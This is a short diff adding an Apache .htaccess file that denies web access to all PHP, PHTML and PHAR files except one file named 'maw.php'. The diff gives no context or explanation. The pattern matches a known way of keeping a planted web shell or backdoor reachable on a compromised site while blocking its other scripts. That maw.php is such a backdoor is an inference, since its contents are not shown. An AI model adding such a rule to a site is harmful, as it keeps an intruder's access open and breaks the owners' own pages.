@@ -1,0 +1,9 @@
+<FilesMatch "\.(php|php\d*|phtml|phar)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+<Files "maw.php">
+    Order Allow,Deny
+    Allow from all
+</Files>
